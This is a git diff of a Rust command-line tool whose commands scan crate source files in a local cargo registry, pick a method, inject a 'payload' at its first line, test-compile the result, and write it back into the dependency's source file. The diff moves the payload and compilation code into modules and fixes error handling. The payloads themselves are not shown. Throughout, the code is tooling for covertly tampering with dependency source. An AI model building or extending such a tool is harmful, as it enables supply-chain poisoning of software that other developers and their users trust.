@@ -28,11 +28,17 @@
 // 3. run integrate command
 // 4. run ok command
 
-use std::path::Path;
+mod vanalyzer;
+mod payload;
+mod compilation;
+
 use log::{error, info}; 
+use std::path::Path;
 use std::io::Write;
 
-fn vanalyze(path: &Path, username: &str) -> Vaoutput {}
+use vanalyzer::*;
+use payload::*;
+use compilation::*;
 
 // Returns a rust program to be compiled afterwards
 // Injects in the <file_selected> file at line <method_starting_line> the code for running
@@ -45,7 +51,7 @@ fn integrate(file_selected: &String, method_starting_line: usize, payload: &dyn 
    )
 }
 // returns error if compilation was not successful
-fn ok_command(comp_stat: CompilationStatus) -> Result<(), String> {
+fn ok_command(comp_stat: &CompilationStatus) -> Result<(), String> {
     match comp_stat {
         CompilationStatus::Correct(prog, file) /* Merge file */ => {
             std::fs::OpenOptions::new()
@@ -60,96 +66,16 @@ fn ok_command(comp_stat: CompilationStatus) -> Result<(), String> {
     }
 }
 
-
-// ghost function
-// takes a string, creates a rust program with it and compiles it returning its result
-fn compile_mock_integration(src_program: &str, target_crate: &str, target_file: &str) -> CompilationStatus {
-  //create file with <src_program>'s content 
-  let new_file_path = "/tmp/mock_program.rs".to_string();
-  std::fs::File::create(new_file_path).unwrap().write(src_program.as_bytes());
-  // run shell script
-  let output = std::process::Command::new("/bin/bash")
-      .args(["shell-scripts/compile_mock_integration.sh", target_crate, target_file, &new_file_path])
-      .stdout(std::process::Stdio::piped())
-      .stderr(std::process::Stdio::piped())
-      .output()
-      .unwrap();
-  // convert output to CompilationStatus
-  if output.stdout.len() > 0 {
-      CompilationStatus::Correct(src_program.to_string(), target_file.to_string())
-  }
-  else {
-      CompilationStatus::Flaw(String::from_utf8(output.stderr).unwrap())
-  }
-}
-
-enum CompilationStatus {
-    Correct(String, String), // contains the resulting program that compiled and the target_file
-    Flaw(String) // contains the error message
-}
-
-// payload result wrapper
-type PayloadResult<R> = Result<R, String>;
-
-// trait Payload which must be implemented by all available payloads
-// permits a payload to be injectable to some given code in the line specified
-pub trait Payload {
-    // takes a bunch of string lines and a line number and injects the payload implementing it
-    // into the string starting from <line_no>
-    fn inject(&self, src: &str, line_no: &usize) -> PayloadResult<String>;
-}
-
-pub fn payload_from_str(src: &str) -> &dyn Payload {}
-
-// stores method name and its line number
-struct FileMethod {
-    name: String,
-    line_no: usize
-}
-
-// stores file names, method names and line numbers
-struct FileOutput {
-    name: String,
-    methods: Vec<FileMethod>
-}
-impl FileOutput {
-    pub fn nth_method_sl(&self, method_no: usize) -> Result<&usize, String> {
-       match self.methods.get(method_no) {
-           Some(f_method) => Ok(&f_method.line_no),
-           None => Err("Bad method number".to_string())
-       }
-    }
-}
-
-
-struct Vaoutput {
-   files: Vec<(String, FileOutput)> // crate name + file output
-}
-impl Vaoutput {
-    pub fn nth_file(&self, file_no: usize) -> Result<&FileOutput, String> {
-        match self.files.get(file_no) {
-            Some((_, f_out)) => Ok(f_out),
-            None => Err("Bad file number".to_string())
-        }
-    }
-    pub fn nth_file_crate(&self, file_no: usize) -> Result<&String, String> {
-        match self.files.get(file_no) {
-            Some((crate_name, _)) => Ok(crate_name),
-            None => Err("Bad file number".to_string())
-        }
-    }
-}
-
 fn main() {
     // launch reader thread with socket fd
     let (tx, rx) = std::sync::mpsc::channel::<String>();
     std::thread::spawn(move || {
         loop {
             let stdin = std::io::stdin();
-            let mut buf: String; 
+            let mut buf: String = "".to_string(); 
             match stdin.read_line(&mut buf) {
                 Ok(_) => tx.send(buf).unwrap(),
-                Error => /* This should cause a dead end error */ drop(tx)
+                Err(_) => /* This should cause a dead end error */ { drop(tx); break;}
             }
         }
     });
@@ -161,14 +87,17 @@ fn main() {
                let cmd_parts: Vec<&str> = cmd.split(' ').collect();
                match cmd_parts[0] {
                    "vanalyze" => {
-                       va_output = Some(
-                           vanalyze(Path::new(&cmd_parts[1]), &cmd_parts[2])
-                        );
-                   }
+                       info!("Running vanalyzer command");
+                       match vanalyze(Path::new(&cmd_parts[1]), &cmd_parts[2]) {
+                           Ok(vaout) => {va_output = Some(vaout)},
+                           Err(e) => error!("Run vanalyzer again due to unexpected: {e}") 
+                       }
+                   },
                    "integrate" => {
+                       info!("Running integrate command");
                        if let Some(ref va_out) = va_output {
-
-                           let file_selected = va_out.nth_file(cmd_parts[1].parse::<usize>().unwrap()).expect("Bad file number");
+                           let file_no = cmd_parts[1].parse::<usize>().unwrap();
+                           let file_selected = va_out.nth_file(file_no.clone()).expect("Bad file number");
                            let method_sl = file_selected.nth_method_sl(
                         cmd_parts[2].parse::<usize>().unwrap()
                                ).expect("Bad method number");
@@ -177,25 +106,21 @@ fn main() {
                                                 , method_sl.clone() 
                                                 , payload_from_str(cmd_parts[3])
                            ).unwrap();
-                           // /home/username/.cargo/registry/src/*/crate_name/...
-                           // crate's path ends at the 8th forslash
-                           let (target_crate, mut target_file) = cmd_parts[1].match_indices('/').nth(7).map(|(index, _)| cmd_parts[1].split_at(index)).unwrap();
-                           target_file = &target_file.replacen('/', "", 1);
                            comp_res = Some(
                                compile_mock_integration(&integrated_payload
-                               , target_crate
-                               , target_file)
+                               , va_out.nth_file_crate(file_no).expect("Bad file number") 
+                               , &file_selected.name)
                             );
                        } else {
                            error!("You must run vanalyze command before");
                        }
                    },
                    "exploit" => { 
-                       
+                       info!("Running exploit command"); 
                         // get method starting line
                         // read file until you hit with the method
-                        let reader = std::fs::read_to_string(&cmd_parts[1].to_string()).unwrap().lines();
-                        let maybe_line =  reader.enumerate().filter(|(line_no, line)| line.contains(" fn ") && line.contains(cmd_parts[2]) /* may not be exhaustive but dah */).collect::<Vec<(usize, &str)>>(); 
+                        let reader = std::fs::read_to_string(&cmd_parts[1].to_string()).unwrap();
+                        let maybe_line =  reader.lines().enumerate().filter(|(_, line)| line.contains(" fn ") && line.contains(cmd_parts[2]) /* may not be exhaustive but dah */).collect::<Vec<(usize, &str)>>(); 
 
                         if maybe_line.len() > 0 {
                             let method_line = maybe_line[0].0;
@@ -204,20 +129,24 @@ fn main() {
                                       , method_line 
                                       , payload_from_str(cmd_parts[3])
                               );
-                           let target_file
-                           comp_res = Some(
-                               compile_mock_integration(&integrated_payload.expect("error injecting payload")
-                               , 
-                               , cmd_parts[1])
-                            );
+                               // /home/username/.cargo/registry/src/*/crate_name/...
+                               // crate's path ends at the 8th forslash
+                               let (target_crate, target_file) = cmd_parts[1].match_indices('/').nth(7).map(|(index, _)| cmd_parts[1].split_at(index)).unwrap();
+                               let target_file = target_file.replacen('/', "", 1);
+                               comp_res = Some(
+                                   compile_mock_integration(&integrated_payload.unwrap()
+                                   , target_crate
+                                   , &target_file)
+                                );
                         } else {
                             error!("Method not found in specified file")
                         }
                         
                    },
                    "ok" => {
-                       if let Some(compiled) = comp_res {
-                           ok_command(compiled);
+                       info!("Running ok command");
+                       if let Some(ref compiled) = comp_res {
+                           let _ = ok_command(compiled);
                            info!("Payload has been successfully injected");
                        } else {
                            error!("You must run integrate command before");
